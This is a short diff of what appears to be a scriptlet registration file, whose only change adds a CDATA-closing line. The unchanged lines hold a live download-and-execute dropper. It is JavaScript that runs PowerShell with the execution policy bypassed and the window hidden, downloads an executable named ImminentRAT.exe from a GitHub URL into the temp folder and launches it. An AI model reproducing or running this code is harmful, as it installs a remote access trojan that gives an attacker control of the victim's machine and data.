@@ -14,6 +14,7 @@
   			var dice = "$down = New-Object System.Net.WebClient;$url = 'https://github.com/c0met/123.sct/raw/master/weewgeg.exe';$file = '%TMP%\\ImminentRAT.exe';$down.DownloadFile($url,$file);$exec = New-Object -com shell.application;$exec.shellexecute($file);exit;";
    			var p0wrshell = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -Command ';
    			Wish.Exec(p0wrshell + dice);
+			]]>
 </script>
 </registration>
 
